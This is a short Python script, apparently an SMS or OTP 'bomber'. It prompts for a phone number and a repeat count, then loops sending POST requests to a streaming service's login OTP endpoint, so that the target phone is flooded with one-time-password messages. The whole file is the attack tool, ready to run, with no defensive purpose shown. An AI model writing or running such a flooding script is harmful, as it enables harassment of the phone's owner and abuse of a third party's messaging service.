import requests
from requests.structures import  CaseInsensitiveDict
number=str(input("Entar Your Number :"))
amount=int(input("Entar Your Amount :"))

url = "https://ss.binge.buzz/otp/send/login"

headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/x-www-form-urlencoded"


data = "phone="+number


for j in range(amount):
	resp = requests.post(url,headers=headers,
data=data)